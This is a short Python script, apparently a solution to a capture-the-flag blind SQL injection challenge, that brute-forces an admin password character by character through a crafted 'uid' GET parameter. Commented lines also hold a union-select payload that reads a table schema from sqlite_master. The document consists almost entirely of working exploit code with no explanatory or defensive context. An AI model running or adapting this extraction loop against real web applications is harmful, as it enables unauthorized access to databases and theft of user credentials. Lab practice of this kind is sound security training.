import requests
import string
a=string.ascii_lowercase+string.digits+string.ascii_uppercase+' "_'
c=""
url='http://simple-blind-sql-injection-25ac7174.dailycookie.cloud'
while True:
    for i in a:
        # params={"uid":"' union select 1,2,3 from sqlite_master where tbl_name ='users' and sql like '"+c+i+"%'-- -"} extract table+columns
        #User ' union select 1,2,3 from sqlite_master where tbl_name ='users' and sql like 'crEatE tABLe uSers (___idx_int_auto_increment_primary_key,___uid_varchar(128)_not_null,___upw_varchar(128)_not_n%'-- - exists
        params={"uid":"admin' and upw like'"+c+i+"%"}
        r=requests.get(url,params=params)
        d=r.text.split('<h2>')[1].split("</h2>")[0]
        if "exists" in d:
            c+=i
            print(d)# extract columns and tables
            break
